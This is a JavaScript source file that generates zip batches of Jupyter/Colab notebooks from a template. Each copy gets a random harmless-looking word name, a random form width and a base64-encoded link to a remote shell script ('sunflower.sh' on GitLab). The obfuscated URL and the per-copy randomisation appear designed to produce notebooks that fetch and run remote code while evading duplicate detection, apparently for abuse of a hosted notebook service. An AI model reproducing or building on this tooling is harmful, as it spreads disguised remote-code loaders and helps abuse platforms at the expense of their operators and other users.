const file_count = 5

$(document).ready(function () {
    console.log("ready!");

    $('#generate-button').click(function () {
        generate($('#archive-count').val())
    })
});

function generate(archive_count) {
    console.log('Generating ' + archive_count + ' archives.')

    fetch('sunflower/sunflower.ipynb')
        .then(resp => resp.json())
        .then(data => {
            let input_file = JSON.stringify(data)
            console.log(input_file)

            for (let archive = 1; archive <= archive_count; archive++) {
                let zip = new JSZip();

                for (let i = 0; i < file_count; i++) {
                    const id = get_random_id()
                    // console.log(id)

                    const placeholder_name = "_id_", hash_url_name = "_url_", form_width_name = "_form_width_"

                    const url_hash = btoa(`https://gitlab.com/white-sagittarius/sunflower/-/raw/main/sunflower.sh?salt=${id}`)

                    let output_file = input_file.replaceAll(form_width_name, Math.floor(((Math.random() * 4999) + 5000)).toString())
                        .replaceAll(placeholder_name, id)
                        .replaceAll(hash_url_name, url_hash)
                    console.log(output_file)

                    zip.file(id + '.ipynb', output_file)
                }

                zip.generateAsync({type: "blob"})
                    .then(function (blob) {
                        saveAs(blob, 'colab ' + archive + ' .zip');
                    });
            }

        })
        .catch((e) => alert('Oh no! Some error happened: ' + e.toString()));
}

function get_random_id() {
    const P1 = ['cellar', 'number', 'flag', 'exchange', 'meeting', 'fairies', 'cobweb', 'harmony', 'mass', 'quiet', 'base', 'use', 'store', 'tramp', 'zinc', 'care', 'holiday', 'expansion', 'team', 'spiders', 'bath', 'ground', 'creator', 'bell', 'tub', 'jellyfish', 'rain', 'hole', 'actor', 'trip', 'teaching', 'whip', 'tent', 'sheet', 'bulb', 'transport', 'bite', 'match', 'boundary', 'flavor', 'hook', 'root', 'iron', 'prose', 'vest', 'jar', 'day', 'cave', 'rule', 'rest', 'growth', 'rhythm', 'oatmeal', 'motion', 'watch', 'plane', 'ticket', 'afterthought', 'unit', 'top', 'soda', 'request', 'monkey', 'coach', 'hall', 'cart', 'wax', 'swim', 'station', 'potato', 'hose', 'verse', 'change', 'wall', 'thing', 'curve', 'mask', 'queen', 'scene', 'branch', 'history', 'camera', 'writing', 'ball', 'join', 'earth', 'library', 'butter', 'stomach', 'parcel', 'pig', 'feeling', 'visitor', 'truck', 'night', 'produce', 'push', 'lamp', 'rub', 'bridge', 'edge', 'language', 'pail', 'wine', 'ring', 'pizzas', 'camp', 'sun', 'surprise', 'water', 'dinosaurs', 'position', 'island', 'health', 'adjustment', 'pin', 'control', 'account', 'zipper', 'talk', 'loss', 'kiss', 'plastic', 'current', 'donkey', 'turn', 'giants', 'tax', 'pencil', 'worm', 'boat', 'thread', 'fang', 'sock', 'instrument', 'cake', 'agreement', 'apparatus', 'fish', 'cactus', 'story', 'head', 'brake', 'toes', 'wave', 'son', 'mark', 'connection', 'cakes', 'hands', 'slip', 'structure', 'birth', 'border', 'representative', 'juice', 'trade', 'badge', 'bear', 'honey', 'grandmother', 'desk', 'grain', 'window', 'mouth', 'pest', 'pipe', 'rate', 'grandfather', 'soup', 'corn', 'partner', 'downtown', 'country', 'respect', 'territory', 'note', 'book', 'eyes', 'lip', 'coal', 'toy', 'insect', 'crib', 'rabbit', 'ladybug', 'thumb', 'kittens', 'shelf', 'selection', 'writer', 'laugh', 'chalk', 'order', 'basket', 'sack', 'swing', 'hand', 'experience', 'hydrant', 'porter', 'deer', 'direction', 'coil', 'nation', 'cap', 'suit', 'winter', 'soap', 'friends', 'comparison', 'nose', 'earthquake', 'seashore', 'show', 'elbow', 'spring', 'range', 'purpose', 'curtain', 'squirrel', 'cemetery', 'wilderness', 'rose', 'burst', 'kick', 'tomatoes', 'steel', 'cannon', 'hospital', 'road', 'system', 'calendar', 'trains', 'horse', 'ship', 'lunch', 'ghost', 'friend', 'frogs', 'afternoon', 'gate', 'stocking', 'sponge', 'houses', 'stage', 'cheese', 'debt', 'amount', 'event', 'party', 'fold', 'engine', 'bushes', 'sand', 'mitten', 'sort', 'linen', 'knot', 'snail', 'fireman', 'egg', 'orange', 'trouble', 'sea', 'quilt', 'credit', 'design', 'discussion', 'trail', 'smell', 'income', 'force', 'business', 'hair', 'face', 'rifle', 'knowledge', 'skirt', 'bubble', 'club', 'tongue', 'quince', 'cough', 'quicksand', 'play', 'milk', 'pets', 'cast', 'process', 'calculate', 'analyze', 'prepare', 'manage', 'convert', 'propagate', 'fetch', 'check', 'complete', 'suggest', 'launch', 'describe', 'use', 'compete', 'bubble', 'reduce', 'identify', 'fold', 'queue', 'test', 'prepare', 'spot', 'match', 'join', 'look', 'trace', 'observe', 'switch', 'unite', 'guess', 'try', 'mix', 'consist']
    const P2 = ['plastic', 'drain', 'salt', 'waves', 'cent', 'scarf', 'gate', 'train', 'ladybug', 'throat', 'addition', 'cub', 'taste', 'lettuce', 'dogs', 'competition', 'ice', 'suggestion', 'quiet', 'card', 'carpenter', 'lace', 'smile', 'representative', 'substance', 'camp', 'connection', 'horse', 'spoon', 'degree', 'minute', 'toad', 'mind', 'digestion', 'skin', 'existence', 'toothbrush', 'division', 'sugar', 'suit', 'hydrant', 'furniture', 'magic', 'window', 'yak', 'snake', 'event', 'railway', 'cherry', 'arch', 'stomach', 'loss', 'horn', 'ink', 'jar', 'leg', 'creator', 'lock', 'quarter', 'wilderness', 'beef', 'notebook', 'crow', 'cow', 'unit', 'snakes', 'jewel', 'approval', 'kick', 'cloth', 'snow', 'side', 'fairies', 'work', 'volleyball', 'back', 'hand', 'root', 'chicken', 'sleep', 'stamp', 'sound', 'line', 'egg', 'rings', 'toothpaste', 'flight', 'bedroom', 'ocean', 'mark', 'teeth', 'transport', 'soda', 'oranges', 'spade', 'quince', 'payment', 'coach', 'birth', 'motion', 'animal', 'calendar', 'doctor', 'cover', 'pest', 'stretch', 'dinosaurs', 'spiders', 'star', 'crayon', 'seashore', 'donkey', 'profit', 'lake', 'afternoon', 'rake', 'toe', 'top', 'feeling', 'yarn', 'watch', 'lamp', 'distance', 'powder', 'cars', 'ring', 'run', 'pet', 'calculator', 'plantation', 'wealth', 'key', 'wrench', 'harpoon', 'solace']
    const P3 = ['jelly', 'distribution', 'bead', 'orange', 'sticks', 'shake', 'passenger', 'friction', 'science', 'mountain', 'zipper', 'holiday', 'board', 'cherries', 'ladybug', 'bit', 'growth', 'home', 'card', 'reason', 'touch', 'afternoon', 'bat', 'cakes', 'hydrant', 'adjustment', 'tray', 'nation', 'form', 'system', 'bed', 'view', 'hat', 'fall', 'design', 'leather', 'leg', 'shape', 'calculator', 'cook', 'guide', 'giants', 'playground', 'calendar', 'silver', 'memory', 'breath', 'silk', 'letters', 'pancake', 'wilderness', 'offer', 'governor', 'tree', 'tail', 'history', 'drawer', 'control', 'example', 'mouth', 'crowd', 'thing', 'invention', 'current', 'pets', 'soda', 'books', 'space', 'writing', 'field', 'face', 'turn', 'cabbage', 'party', 'cake', 'scissors', 'elbow', 'butter', 'van', 'yard', 'tomatoes', 'exchange', 'sense', 'thought', 'airplane', 'fork', 'digestion', 'advice', 'ants', 'creator', 'rainstorm', 'river', 'quill', 'sky', 'curve', 'side', 'pen', 'collar', 'shop', 'match', 'sweater', 'crate', 'industry', 'tongue', 'show', 'laugh', 'steam', 'boat', 'week', 'ring', 'vegetable', 'carriage', 'ball', 'whistle', 'coat', 'jewel', 'position', 'edge', 'trail', 'quiver', 'cover', 'furniture', 'existence', 'use', 'zinc', 'celery', 'recess', 'library', 'pigs', 'pet', 'dinner', 'hall', 'swing', 'class', 'toy', 'geese', 'letter']

    let name2_separator = '', name2 = '', name3_separator = '', name3 = '', name4_separator = '', name4 = ''
    if (Math.random() < 0.3) {
        name2_separator = '_'
    } else {
        if (Math.random() < 0.3) {
            name2_separator = '-'
        }
    }
    if (Math.random() < 0.8) {
        name2 = name2_separator + P2[Math.floor(Math.random() * 135)]
    }

    if (Math.random() < 0.3) {
        name3_separator = '_'
    } else {
        if (Math.random() < 0.3) {
            name3_separator = '-'
        }
    }
    if (Math.random() < 0.3) {
        name3 = name3_separator + P3[Math.floor(Math.random() * 137)]
    }

    if (Math.random() < 0.3) {
        name4_separator = '_'
    } else {
        if (Math.random() < 0.3) {
            name4_separator = '-'
        }
    }
    if (Math.random() < 0.1) {
        name4 = name4_separator + P1[Math.floor(Math.random() * 323)]
    }

    let id = P1[Math.floor(Math.random() * 323)] + name2 + name3 + name4

    if (P1.includes(id)) {
        let suffix = ''
        if (Math.random() < 0.3) {
            suffix = '_'
        } else {
            if (Math.random() < 0.3) {
                suffix = '-'
            }
        }

        id += suffix + Math.floor(Math.random() * 5).toString()
    }

    return id

    // const xhttp = new XMLHttpRequest();
    // xhttp.open("GET", `https://random-word-api.herokuapp.com/word?number=${Math.round((Math.random() * 5) + 3)}`, false);
    // xhttp.send();
    //
    // const response = JSON.parse(xhttp.responseText)
    // let id = ''
    // response.slice(0, response.length - 1).forEach(function (word) {
    //     id += word
    //     id += ['-', '_', ''][Math.round(Math.random() * 3)]
    // })
    // id += response[response.length - 1]
}